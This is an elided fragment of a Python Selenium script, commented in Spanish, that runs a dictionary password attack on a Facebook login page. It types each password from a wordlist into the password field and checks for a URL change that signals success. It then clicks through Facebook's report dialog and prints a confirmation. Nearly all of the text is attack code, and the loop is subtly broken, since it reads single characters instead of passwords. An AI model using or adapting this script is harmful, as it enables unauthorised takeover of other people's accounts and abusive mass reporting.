...
#Confirmamos si el titolo de la Pag es Facebook
assert "Facebook" in driver.title

#Inicia el Proceso de lla Rutina
def facebook():
    time.sleep(2)
    for password in dicpass.readline():
        #Ingreso de Usuario
        ...
        elem_pass.clear()
        elem_pass.send_keys(password.strip())
        time.sleep(2)
        ...
        if k != "https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=110":
            ...
            time.sleep(3)
            elem = driver.find_element_by_class_name("_271k._271m._1qjd.layerCancel._3-99._7tvm._7tv2._7tv4").click()
            time.sleep(3)
            elem_denuncia = driver.find_element_by_class_name("_42ef._8u").click()
            print("Denincia Hecha")
